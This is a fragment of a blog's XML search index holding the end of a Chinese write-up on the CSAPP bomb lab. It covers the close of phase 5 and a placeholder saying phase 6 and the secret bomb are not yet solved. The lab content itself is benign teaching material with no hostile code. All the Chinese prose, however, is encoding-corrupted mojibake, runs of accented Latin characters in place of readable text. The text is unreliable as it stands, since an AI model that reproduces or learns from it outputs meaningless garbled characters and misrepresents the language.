src="https://i.loli.net/2021/04/25/EWxXJ2PuAQ3HoIc.png" alt="bomblab_phase_5_4.png"></p><p>å› ä¸ºæ¯ä¸ªå­—ç¬¦éƒ½æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨è¿™å…­è¡Œä»»æ„å–ä¸€ä¸ªå¯è¯»å­—ç¬¦æœ€åæ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚å› ä¸ºæœ‰äº›å­—ç¬¦ä¸å¯ç¼–è¾‘ï¼Œæ‰€ä»¥é‡‡å–è¿™ç§æªæ–½æ˜¯æœ€å¦™çš„ã€‚</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>å¾…æ›´æ–°</p><p>å› ä¸ºä½œè€…ç›®å‰æ¯”è¾ƒèœï¼Œphase_6å’Œsecret_bombéƒ½ä¸ä¼šåšï¼Œå¦‚æœä¸Šé¢æœ‰å“ªé‡Œè¯´çš„ä¸å¯¹çš„æ³è¯·æŒ‡æ­£ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
